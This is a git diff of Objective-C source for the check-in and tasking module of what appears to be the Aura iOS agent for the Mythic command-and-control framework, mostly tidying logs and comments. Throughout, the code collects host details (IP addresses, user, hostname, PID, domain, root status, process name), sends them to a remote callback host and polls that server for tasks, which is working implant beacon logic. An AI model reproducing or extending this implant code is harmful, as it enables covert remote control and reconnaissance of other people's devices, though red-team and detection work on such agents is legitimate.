@@ -8,6 +8,7 @@
 
 @implementation C2CheckIn
 
+/// Track the callback UUID (used for sending agent messages)
 NSString *callbackUUID = nil;
 
 + (void)performPlaintextCheckin {
@@ -18,16 +19,12 @@ NSString *callbackUUID = nil;
     NSString *postURI = @"agent_message";
     NSString *payloadUUID = [HTTPC2Config payloadUUID];
 
-    NSLog(@"[DEBUG] Callback Host: %@", callbackHost);
-    NSLog(@"[DEBUG] Callback Port: %ld", (long)callbackPort);
-    NSLog(@"[DEBUG] Post URI: %@", postURI);
-
     /// The check-in endpoint: `http://<callbackHost>:<callbackPort>/agent_message`
     NSString *urlString = [NSString stringWithFormat:@"%@:%ld/%@", callbackHost, (long)callbackPort, postURI];
     NSURL *url = [NSURL URLWithString:urlString];
     NSLog(@"[DEBUG] Check-in URL: %@", url);
 
-    /// Get the system info
+    /// Get the device info
     NSString *internalIP = [SystemInfoHelper getInternalIPAddress];
     NSInteger pid = [SystemInfoHelper getPID];
     NSString *user = [SystemInfoHelper getUser];
@@ -36,33 +33,35 @@ NSString *callbackUUID = nil;
     NSString *arch = [SystemInfoHelper getArchitecture];
     NSString *domain = [SystemInfoHelper getDomain];
     NSString *externalIP = [SystemInfoHelper getExternalIPAddress];
+    NSString *processName = [SystemInfoHelper getProcessName];
+
     /// Check if running as root for the integrity level
-    /// https://docs.mythic-c2.net/customizing/payload-type-development/create_tasking/agent-side-coding/initial-checkin
+    /// Mythic docs: https://docs.mythic-c2.net/customizing/payload-type-development/create_tasking/agent-side-coding/initial-checkin
     int integrityLevel = getuid() == 0 ? 4 : 2;
 
     /// Construct the check-in JSON we'll send to Mythic
     NSDictionary *checkinData = @{
         @"action": @"checkin",
         @"uuid": payloadUUID,
-        @"ips": @[internalIP],
-        @"os": os,
-        @"user": user,
-        @"host": host,
-        @"pid": @(pid),
-        @"architecture": @"arm64",
-        @"domain": domain,
-        @"external_ip": externalIP,
-        @"integrity_level": @(integrityLevel),
-        @"process_name": @"aura"
+        @"ips": @[internalIP],        // Internal IP address array
+        @"os": os,                    // Operating system details
+        @"user": user,                // Username
+        @"host": host,                // Hostname
+        @"pid": @(pid),               // PID
+        @"architecture": arch,        // Architecture (arm64, x86_64, etc.)
+        @"domain": domain,            // Domain information
+        @"external_ip": externalIP,   // External IP
+        @"integrity_level": @(integrityLevel), // "Integrity level" (root or normal user)
+        @"process_name": processName  // Process name
     };
 
     /// Log what we're going to check-in
-    NSLog(@"# 👋 Hello from the Aura iOS agent!\n%@\n\n", checkinData);
+    NSLog(@"%@", checkinData);
 
     NSError *jsonError;
     NSData *jsonData = [NSJSONSerialization dataWithJSONObject:checkinData options:0 error:&jsonError];
     if (jsonError) {
-        NSLog(@"[ERROR] Error creating JSON: %@", jsonError.localizedDescription);
+        NSLog(@"[ERROR] ❌ Error creating JSON: %@", jsonError.localizedDescription);
         return;
     }
 
@@ -89,7 +88,7 @@ NSString *callbackUUID = nil;
 
     NSURLSessionDataTask *task = [session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
         if (error) {
-            NSLog(@"[ERROR] Error during check-in: %@", error.localizedDescription);
+            NSLog(@"[ERROR] ❌ Error during check-in: %@", error.localizedDescription);
         } else {
             NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *)response;
             if (httpResponse.statusCode == 200) {
@@ -102,7 +101,7 @@ NSString *callbackUUID = nil;
                         /// Decode the b64 response string
                         NSData *decodedData = [[NSData alloc] initWithBase64EncodedString:responseString options:0];
                         if (decodedData == nil) {
-                            NSLog(@"[ERROR] Failed to decode base64 response.");
+                            NSLog(@"[ERROR] ❌ Failed to decode base64 response.");
                             return;
                         }
 
@@ -124,7 +123,7 @@ NSString *callbackUUID = nil;
 
                             if (jsonError) {
                                 NSLog(@"[ERROR] Failed to parse JSON: %@", jsonError.localizedDescription);
-                                NSLog(@"[DEBUG] Raw responseWithoutUUID: %@", responseWithoutUUID);
+                                NSLog(@"[DEBUG] Raw response without UUID: %@", responseWithoutUUID);
                             } else {
                                 NSLog(@"[DEBUG] Parsed JSON: %@", jsonResponse);
                                 if (jsonResponse[@"id"]) {
@@ -132,16 +131,16 @@ NSString *callbackUUID = nil;
                                     callbackUUID = jsonResponse[@"id"];  
                                     NSLog(@"[DEBUG] Our Callback UUID\t===>\t(%@)", callbackUUID);
                                 } else {
-                                    NSLog(@"[ERROR] No 'id' key found in the JSON.");
+                                    NSLog(@"[ERROR] ❌ No 'id' key found in the JSON.");
                                 }
                             }
                         }
                     } else {
-                        NSLog(@"[ERROR] Response is too short. Full response: %@", responseString);
+                        NSLog(@"[ERROR] ❌ Response is too short. Full response: %@", responseString);
                     }
                 }
             } else {
-                NSLog(@"[ERROR] Failed to check-in with Mythic!. HTTP Status Code: %ld", (long)httpResponse.statusCode);
+                NSLog(@"[ERROR] ❌ Failed to check-in with Mythic!. HTTP Status Code: %ld", (long)httpResponse.statusCode);
             }
         }
         dispatch_semaphore_signal(sema);
@@ -169,11 +168,10 @@ NSString *callbackUUID = nil;
     }
 }
 
-
 + (void)getTasking {
-    // Ensure we have the callbackUUID to use
+    /// We use the callback UUID here to check back in with Mythic for tasking
     if (callbackUUID == nil) {
-        NSLog(@"[ERROR] No callback UUID available for tasking. Did you perform check-in?");
+        NSLog(@"[ERROR] ❌ No callback UUID available to check for tasking....");
         return;
     }
 
@@ -198,7 +196,7 @@ NSString *callbackUUID = nil;
     NSError *jsonError;
     NSData *jsonData = [NSJSONSerialization dataWithJSONObject:taskingData options:0 error:&jsonError];
     if (jsonError) {
-        NSLog(@"[ERROR] Error creating JSON: %@", jsonError.localizedDescription);
+        NSLog(@"[ERROR] ❌ Error creating JSON: %@", jsonError.localizedDescription);
         return;
     }
 
@@ -216,10 +214,8 @@ NSString *callbackUUID = nil;
     [request setHTTPBody:[base64TaskingMessage dataUsingEncoding:NSUTF8StringEncoding]];
     [request addValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
 
-    // Add headers from configuration
     for (NSString *key in headers) {
         [request addValue:headers[key] forHTTPHeaderField:key];
-        // NSLog(@"[DEBUG] Adding header: %@ = %@", key, headers[key]);
     }
 
     NSURLSession *session = [NSURLSession sharedSession];
@@ -250,15 +246,11 @@ NSString *callbackUUID = nil;
                     NSRange jsonRange = [decodedString rangeOfString:@"{"];
                     if (jsonRange.location != NSNotFound) {
                         NSString *jsonString = [decodedString substringFromIndex:jsonRange.location];
-                        // NSLog(@"[DEBUG] Extracted JSON string: %@", jsonString);
-
-                        // Parse the JSON string
                         NSData *jsonData = [jsonString dataUsingEncoding:NSUTF8StringEncoding];
                         NSDictionary *taskingResponse = [NSJSONSerialization JSONObjectWithData:jsonData options:0 error:nil];
 
                         if (taskingResponse) {
                             // NSLog(@"[DEBUG] Parsed JSON: %@", taskingResponse);
-                            // Handle the parsed tasking response here, e.g., extract tasks, actions, etc.
                             NSString *action = taskingResponse[@"action"];
                             NSArray *tasks = taskingResponse[@"tasks"];
                             if ([action isEqualToString:@"get_tasking"] && tasks.count > 0) {
@@ -269,14 +261,14 @@ NSString *callbackUUID = nil;
                                 NSLog(@"[DEBUG] ⌚️ Waiting on tasking...");
                             }
                         } else {
-                            NSLog(@"[ERROR] Failed to parse JSON from decoded tasking response.");
+                            NSLog(@"[ERROR] ❌ Failed to parse JSON from decoded tasking response.");
                         }
                     } else {
-                        NSLog(@"[ERROR] Failed to locate JSON within the decoded string.");
+                        NSLog(@"[ERROR] ❌ Failed to locate JSON within the decoded string.");
                     }
                 }
             } else {
-                NSLog(@"[ERROR] Failed to fetch tasking. HTTP Status Code: %ld", (long)httpResponse.statusCode);
+                NSLog(@"[ERROR] ❌ Failed to fetch tasking. HTTP Status Code: %ld", (long)httpResponse.statusCode);
             }
         }
         dispatch_semaphore_signal(sema);
